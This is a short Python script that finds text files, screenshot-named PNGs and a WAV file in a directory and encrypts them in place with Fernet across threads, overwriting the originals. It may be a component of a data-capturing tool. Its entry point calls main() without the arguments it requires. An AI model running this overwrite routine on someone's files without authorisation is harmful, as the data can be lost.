
from cryptography.fernet import Fernet
import threading
import os


txt_tup=()  
png_tup=()
audio=""

def main(path,key):

    e_key=Fernet(key)
    
    def get_files():

        global txt_tup
        global png_tup
        global audio

        list=os.listdir(path)
        for x in list:
            if x.endswith(".txt"):
                txt_tup+=(x,)
            if x.endswith("ss.png"):
                png_tup+=(x,)
            if x.endswith(".wav"):
                audio=(str)(x)        

    get_files()
    
    def e_txt():
        for tf in txt_tup:
            with open(path+tf,'rb') as f:
                data=f.read()
                encryted_data=e_key.encrypt(data)
            
            with open(path+tf, 'wb')as f:
                f.write(encryted_data)

    def e_png():
        for pf in png_tup:
            with open(path+pf,'rb') as f:
                data=f.read()
                encryted_data=e_key.encrypt(data)
            
            with open(path+pf, 'wb')as f:
                f.write(encryted_data)

    def e_wav():
        with open(path+audio,'rb') as f:
                data=f.read()
                encryted_data=e_key.encrypt(data)
            
        with open(path+audio, 'wb')as f:
                f.write(encryted_data)

    et_t=threading.Thread(target=e_txt,daemon=True)
    ep_t=threading.Thread(target=e_png,daemon=True)
    ew_t=threading.Thread(target=e_wav,daemon=True)
    
    et_t.start()
    ep_t.start()
    ew_t.start()

    et_t.join()
    ep_t.join()
    ew_t.join()
    
        


if __name__ == "__main__":
    main()